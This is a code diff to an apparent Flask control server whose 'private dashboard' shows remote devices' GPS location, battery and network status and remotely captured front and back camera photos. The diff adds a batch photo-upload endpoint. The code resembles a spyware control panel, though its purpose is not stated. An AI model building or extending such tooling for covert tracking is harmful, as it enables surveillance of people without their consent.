@@ -34,8 +34,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
         .info-box strong { font-size: 18px; color: #f1f5f9; }
         .map-container { width: 100%; height: 300px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; }
-        .map-controls { display: flex; gap: 10px; margin-bottom: 15px; }
-        .btn-maps { flex: 1; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; }
+        .btn-maps { display: block; width: 100%; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; margin-bottom: 15px; }
         .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 20px; }
         .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
         .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
@@ -117,7 +116,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             document.getElementById('txt_bateria').innerText = d.battery + '%';
                             document.getElementById('txt_uptime').innerText = d.uptime || '--';
                             document.getElementById('txt_network').innerText = d.network || '--';
-                            // ATUALIZA GPS SEMPRE
                             let lat = parseFloat(d.lat), lon = parseFloat(d.lon);
                             if (lat && lon) {
                                 marker.setLatLng([lat, lon]);
@@ -177,6 +175,20 @@ def comando_camera(device_id):
     db_dispositivos[device_id]["photo_front"] = ""
     db_dispositivos[device_id]["photo_back"] = ""
     return jsonify({"status": "ok"}), 200
+
+@app.route('/api/upload_lote', methods=['POST'])
+def upload_lote():
+    """RECEBE AS DUAS FOTOS EM UM ÚNICO PACOTE"""
+    data = request.get_json(force=True, silent=True) or {}
+    dev_id = data.get("device_id", '').upper()
+    if dev_id and dev_id in db_dispositivos:
+        if data.get("photo_front"):
+            db_dispositivos[dev_id]["photo_front"] = data["photo_front"]
+        if data.get("photo_back"):
+            db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
+        logger.info(f"LOTE recebido de {dev_id}")
+        return jsonify({"status": "stored"}), 200
+    return jsonify({"status": "error"}), 404
 
 @app.route('/api/upload_camera', methods=['POST'])
 def upload_camera():
